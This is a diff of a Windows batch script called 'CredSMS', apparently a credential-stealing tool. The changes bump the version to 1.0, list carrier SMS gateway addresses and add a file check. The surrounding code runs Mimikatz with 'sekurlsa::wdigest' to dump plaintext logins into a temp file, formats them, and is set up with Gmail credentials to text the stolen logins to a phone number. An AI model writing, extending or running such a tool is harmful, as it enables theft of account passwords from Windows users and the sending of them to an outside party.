@@ -3,14 +3,23 @@
 CLS
 
 :::::::::::::   CHANGE THESE VALUES  :::::::::::::::::
-
-:: Change These Before Running!
+::
+:: 			Change These Before Running!
 SET From=username@gmail.com
 SET Pass=password
-
-:: Where to Send the SMS ?
+::
+:: 			   Where to Send the SMS ?
 SET To=phonenumber@tmomail.net
-
+::
+::
+:: 		AT&T = @txt.att.net
+:: 		Verizon = @vtext.com
+:: 		T-Mobile = @tmomail.net
+:: 		Sprint = messaging.sprintpcs.com
+::	 	Straight Talk = @vtext.com
+:: 		Cricket = @sms.mycricket.com
+:: 		Boost = @myboostmobile.com
+::
 :::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 :: Getting Ready
@@ -20,7 +29,7 @@ IF EXIST *.txt DEL *.txt /F /Q >nul 2>&1
 :: Parameters
 IF "%1"=="/?" (
 	Echo.
-	Echo    CredSMS 0.8, by SpokedVictor a.k.a Spok3d
+	Echo    CredSMS 1.0, by SpokedVictor a.k.a Spok3d
 	Echo.
 	Echo /l = Save Locally
 	Echo /v = Version Info
@@ -29,7 +38,7 @@ IF "%1"=="/?" (
 )
 
 IF "%1"=="/v" (
-	Echo Version: 0.8
+	Echo Version: 1.0
 	Pause >nul 2>&1
 	Exit
 )
@@ -57,7 +66,7 @@ IF "%1"=="/l" (
 :: Start Program
 :Start
 Color 1A
-Title CredSMS v0.8
+Title CredSMS v1.0
 Mode con:cols=47 lines=17
 CLS
 CC 1F
@@ -69,7 +78,7 @@ Echo                 Credential SMSer
 CC 1B
 Echo                 By SpokedVictor
 CC 13
-Echo                   Version 0.8
+Echo                   Version 1.0
 CC 1F
 Echo   I                                         I
 Echo   \----------------I   =X=   I--------------/
@@ -79,7 +88,7 @@ CC 1A
 :: Running Program (step0 basically)
 Echo  Running Mimikatz
 Start /B /W mimikatz.exe "privilege::debug" "sekurlsa::wdigest" Exit > %Temp%\mimikatz.txt
-Title CredSMS v0.8
+Title CredSMS v1.0
 
 :: Formatting Output
 Echo  Formatting
@@ -102,6 +111,14 @@ call repl.bat "%search%" "%replace%" L < "%textfile%" >"%newfile%"
 :: Assign LoginDetails.txt to a Variable
 FOR /F "Tokens=*" %%a in ('type %Temp%\LoginDetails.txt') DO SET S=%%a
 
+IF EXIST %Temp%\LoginDetails.txt (
+	Echo Credential's Missing.
+	Echo Exiting. 
+	Pause >nul
+	Exit
+)
+
+:Continue
 IF "%USB%"=="Yes" (
 	GOTO :Local
 	Exit
